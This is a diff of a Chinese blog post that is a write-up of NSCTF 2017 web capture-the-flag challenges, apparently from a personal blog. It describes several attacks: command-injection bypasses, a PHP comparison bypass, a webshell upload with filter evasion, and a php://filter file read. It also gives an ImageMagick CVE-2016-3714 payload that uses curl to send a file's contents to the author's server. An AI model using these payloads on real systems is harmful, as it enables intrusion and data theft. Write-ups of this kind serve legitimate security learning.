@@ -8,13 +8,13 @@
   <link rel="dns-prefetch" href="https://www.wzsite.cn">
   <title>NSCTF-Web-WriteUp | Wz&#39;s Blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Web-writeup1.web签到题">
+  <meta name="description" content="Web-writeup1.Web签到题">
 <meta name="keywords" content="CTF,WriteUp">
 <meta property="og:type" content="article">
 <meta property="og:title" content="NSCTF-Web-WriteUp">
 <meta property="og:url" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/index.html">
 <meta property="og:site_name" content="Wz&#39;s Blog">
-<meta property="og:description" content="Web-writeup1.web签到题">
+<meta property="og:description" content="Web-writeup1.Web签到题">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-39-21.jpg">
 <meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-22-22.png">
@@ -45,10 +45,10 @@
 <meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-32-02.jpg">
 <meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-32-09.jpg">
 <meta property="og:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-32-16.jpg">
-<meta property="og:updated_time" content="2017-09-27T10:14:36.672Z">
+<meta property="og:updated_time" content="2017-09-27T10:17:06.539Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="NSCTF-Web-WriteUp">
-<meta name="twitter:description" content="Web-writeup1.web签到题">
+<meta name="twitter:description" content="Web-writeup1.Web签到题">
 <meta name="twitter:image" content="https://www.wzsite.cn/2017/09/27/NSCTF-Web-WriteUp/16-39-21.jpg">
   
     <link rel="alternative" href="/atom.xml" title="Wz&#39;s Blog" type="application/atom+xml">
@@ -212,25 +212,25 @@
     <div class="article-entry" itemprop="articleBody">
       
         <img src="/2017/09/27/NSCTF-Web-WriteUp/16-39-21.jpg" alt="16-39-21.jpg" title="">
-<h1 id="Web-writeup"><a href="#Web-writeup" class="headerlink" title="Web-writeup"></a>Web-writeup</h1><h2 id="1-web签到题"><a href="#1-web签到题" class="headerlink" title="1.web签到题"></a>1.web签到题</h2><a id="more"></a>
+<h1 id="Web-writeup"><a href="#Web-writeup" class="headerlink" title="Web-writeup"></a>Web-writeup</h1><h2 id="1-Web签到题"><a href="#1-Web签到题" class="headerlink" title="1.Web签到题"></a>1.Web签到题</h2><a id="more"></a>
 <p>典型签到题，点开网址是一个主办方打广告的主页，想必是跳转了。burp抓一下包就找到flag了。</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-22-22.png" alt="16-22-22.png" title="">
-<h2 id="2-web2-少年你真的会使用PING吗？"><a href="#2-web2-少年你真的会使用PING吗？" class="headerlink" title="2.web2-少年你真的会使用PING吗？"></a>2.web2-少年你真的会使用PING吗？</h2><img src="/2017/09/27/NSCTF-Web-WriteUp/16-22-29.jpg" alt="16-22-29.jpg" title="">
+<h2 id="2-Web2-少年你真的会使用PING吗？"><a href="#2-Web2-少年你真的会使用PING吗？" class="headerlink" title="2.Web2-少年你真的会使用PING吗？"></a>2.Web2-少年你真的会使用PING吗？</h2><img src="/2017/09/27/NSCTF-Web-WriteUp/16-22-29.jpg" alt="16-22-29.jpg" title="">
 <p>进去是一个类似于shell的东西，输个百度地址也能ping通。应该是命令执行绕过。</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-22-36.jpg" alt="16-22-36.jpg" title="">
 <p>一试果然，所以直接cat%20flag_is_here.php，发现没返回，怕是过滤了，用tac命令试一下，成功返回flag。</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-22-43.jpg" alt="16-22-43.jpg" title="">
-<h2 id="3-web3"><a href="#3-web3" class="headerlink" title="3.web3"></a>3.web3</h2><img src="/2017/09/27/NSCTF-Web-WriteUp/16-23-00.jpg" alt="16-23-00.jpg" title="">
+<h2 id="3-Web3"><a href="#3-Web3" class="headerlink" title="3.Web3"></a>3.Web3</h2><img src="/2017/09/27/NSCTF-Web-WriteUp/16-23-00.jpg" alt="16-23-00.jpg" title="">
 <p>随便输入admin信息看一下反应</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-23-06.png" alt="16-23-06.png" title="">
 <p>多post了一个name参数<br>去掉name参数会出现源码，文字已经提示了代码审计。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'login'</span>]))&#123;</div><div class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'user'</span>]))</div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span>(@strcmp($_POST[<span class="string">'user'</span>],$USER))<span class="comment">//USER是被隐藏的复杂用户名</span></div><div class="line">	&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'user错误！'</span>);</div><div class="line">	&#125;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'name'</span>]) &amp;&amp; <span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))</div><div class="line">&#123;</div><div class="line">	<span class="keyword">if</span> ($_POST[<span class="string">'name'</span>] == $_POST[<span class="string">'password'</span>] )</div><div class="line">	&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'账号密码不能一致！'</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">if</span> (md5($_POST[<span class="string">'name'</span>]) === md5($_POST[<span class="string">'password'</span>]))</div><div class="line">	&#123;</div><div class="line">	<span class="keyword">if</span>(is_numeric($_POST[<span class="string">'id'</span>])&amp;&amp;$_POST[<span class="string">'id'</span>]!==<span class="string">'72'</span> &amp;&amp; !preg_match(<span class="string">'/\s/'</span>, $_POST[<span class="string">'id'</span>]))&#123;</div><div class="line">				<span class="keyword">if</span>($_POST[<span class="string">'id'</span>]==<span class="number">72</span>)</div><div class="line">				<span class="keyword">die</span>(<span class="string">"flag&#123;xxxxxxxxxxxxx&#125;"</span>);</div><div class="line">				<span class="keyword">else</span></div><div class="line">					<span class="keyword">die</span>(<span class="string">"ID错误2！"</span>);&#125;</div><div class="line">		<span class="keyword">else</span>&#123;<span class="keyword">die</span>(<span class="string">"ID错误1！"</span>);&#125;</div><div class="line">	&#125;<span class="keyword">else</span>&#123;</div><div class="line">		<span class="keyword">die</span>(<span class="string">'账号密码错误！'</span>);&#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
 <p>根据代码分析，最后POST的参数是user[]=&amp;password[]=&amp;id=072&amp;login=Check&amp;name[]=1<br>就能绕过了</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-01.jpg" alt="16-24-01.jpg" title="">
-<h2 id="3-web4文件上传"><a href="#3-web4文件上传" class="headerlink" title="3.web4文件上传"></a>3.web4文件上传</h2><p>不多说，一个文件上传绕过，甚至还有tips<br>直接找个php一句话木马传上去，看看过滤了什么</p>
+<h2 id="3-Web4文件上传"><a href="#3-Web4文件上传" class="headerlink" title="3.Web4文件上传"></a>3.Web4文件上传</h2><p>不多说，一个文件上传绕过，甚至还有tips<br>直接找个php一句话木马传上去，看看过滤了什么</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-42.jpg" alt="16-24-42.jpg" title="">
 <p>经过试验，后缀名过滤了php，文件内容过滤了&lt;?php等关键字。<br>后缀名可以用.phtml绕过，内容使用<script language="”php”">code</script>绕过<br>上传成功后访问你上传的木马就会得到flag</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-47.jpg" alt="16-24-47.jpg" title="">
-<h2 id="5-web6-Vulhub"><a href="#5-web6-Vulhub" class="headerlink" title="5.web6-Vulhub"></a>5.web6-Vulhub</h2><img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-53.jpg" alt="16-24-53.jpg" title="">
+<h2 id="5-Web6-Vulhub"><a href="#5-Web6-Vulhub" class="headerlink" title="5.Web6-Vulhub"></a>5.Web6-Vulhub</h2><img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-53.jpg" alt="16-24-53.jpg" title="">
 <p>题目一开始给的范围有点大，一开始看到留言，以为XSS，看到提示url_include_open=on，以为文件包含，通过about页面的参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">?f=php://filter/read=convert.base64-encode/resource=xxx.php</div></pre></td></tr></table></figure></p>
 <p>就会得到base64编码后的xxx.php的源码。</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-24-57.png" alt="16-24-57.png" title="">
@@ -244,7 +244,7 @@
 <h3 id="本题总结："><a href="#本题总结：" class="headerlink" title="本题总结："></a>本题总结：</h3><blockquote>
 <p>可以找到的切入点太多（坑太多），混淆视听，实际考察的东西却过于简单，可能是我想太多了吧2333</p>
 </blockquote>
-<h2 id="6-web7-imagemagick"><a href="#6-web7-imagemagick" class="headerlink" title="6.web7-imagemagick"></a>6.web7-imagemagick</h2><p>500分的题目，还是挺有难度的，考查的是一个去年的imagemagick远程执行漏洞（CVE-2016-3714）<br>freebuf上有分析<a href="http://www.freebuf.com/vuls/103504.html" target="_blank" rel="external">http://www.freebuf.com/vuls/103504.html</a></p>
+<h2 id="6-Web7-imagemagick"><a href="#6-Web7-imagemagick" class="headerlink" title="6.Web7-imagemagick"></a>6.Web7-imagemagick</h2><p>500分的题目，还是挺有难度的，考查的是一个去年的imagemagick远程执行漏洞（CVE-2016-3714）<br>freebuf上有分析<a href="http://www.freebuf.com/vuls/103504.html" target="_blank" rel="external">http://www.freebuf.com/vuls/103504.html</a></p>
 <p>一开始没给提示，然后给个phpinfo，然后下午不知道什么时候再给了一个图片才知道是这个漏洞。。（出题人也是无力吐槽，各种改题不提示，环境还迟迟未搭建好）</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-25-45.jpg" alt="16-25-45.jpg" title="">
 <p>网上查到exploit，</p>
@@ -260,9 +260,9 @@
 <p>随后<br>fill ‘url(<a href="https://www.baidu.com/img/bd_logo1.png&quot;|curl" target="_blank" rel="external">https://www.baidu.com/img/bd_logo1.png&quot;|curl</a> –cookie \”name=<code>cat /tmp/flag.txt</code>\” <a href="http://我的vps" target="_blank" rel="external">http://我的vps</a> IP:2502  “)’</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-27-13.jpg" alt="16-27-13.jpg" title="">
 <h3 id="本题总结：-1"><a href="#本题总结：-1" class="headerlink" title="本题总结："></a>本题总结：</h3><blockquote>
-<p>由于本人开始写exploit的时候忽略了一些细节，导致cookie传不出来，也想不到其他传出命令执行结果的方法，故在比赛结束后几分钟才解得flag，丢失了500分,贼气。说明还是得<br>熟悉linux操作、提升漏洞复现，随机应变的能力。</p>
+<p>由于本人开始写exploit的时候忽略了一些细节，导致cookie传不出来，也想不到其他传出命令执行结果的方法，故在比赛结束后几分钟才解得flag，丢失了500分,贼气。说明还是得熟悉linux操作、提升漏洞复现，随机应变的能力。</p>
 </blockquote>
-<h2 id="7-web8-Git泄露"><a href="#7-web8-Git泄露" class="headerlink" title="7.web8-Git泄露"></a>7.web8-Git泄露</h2><p>说是送分题，其实也拖了挺久时间的。。。也许因为太菜吧</p>
+<h2 id="7-Web8-Git泄露"><a href="#7-Web8-Git泄露" class="headerlink" title="7.Web8-Git泄露"></a>7.Web8-Git泄露</h2><p>说是送分题，其实也拖了挺久时间的。。。也许因为太菜吧</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-28-52.jpg" alt="16-28-52.jpg" title="">
 <p>进去提示url=git<br>但是修改url，没有任何反应<br>可能这就是传说中的提示吧</p>
 <p>用Githack扫一下地址就能得到flag了</p>
@@ -270,7 +270,7 @@
 <p>打开83c0eb95cf761515fe09c2ad39527a39.txt</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-29-10.jpg" alt="16-29-10.jpg" title="">Base64解得:<br><br><img src="/2017/09/27/NSCTF-Web-WriteUp/16-29-43.png" alt="16-29-43.png" title="">
 <p><strong>flag:{86045abb89db3e841f68593e3ecb7993}</strong></p>
-<h2 id="8-web9-Wget"><a href="#8-web9-Wget" class="headerlink" title="8.web9-Wget"></a>8.web9-Wget</h2><p>比赛的时候没有做出来这道题，比赛后才知道这种思路。<br>一开始以为绕过wget命令，因为是批量下载，没有绕过。<br>发现可以用wget的参数-P指定目录-O指定文件名字<br>但是随便输入一个地址会发现Permission Denied </p>
+<h2 id="8-Web9-Wget"><a href="#8-Web9-Wget" class="headerlink" title="8.Web9-Wget"></a>8.Web9-Wget</h2><p>比赛的时候没有做出来这道题，比赛后才知道这种思路。<br>一开始以为绕过wget命令，因为是批量下载，没有绕过。<br>发现可以用wget的参数-P指定目录-O指定文件名字<br>但是随便输入一个地址会发现Permission Denied </p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-29-53.png" alt="16-29-53.png" title="">
 <p>说明当前目录不可写<br>然后我就搁置在这了，主要是源码注释里面存在一个admin.php<br>一直在想这个admin.php有啥用</p>
 <img src="/2017/09/27/NSCTF-Web-WriteUp/16-30-25.jpg" alt="16-30-25.jpg" title="">
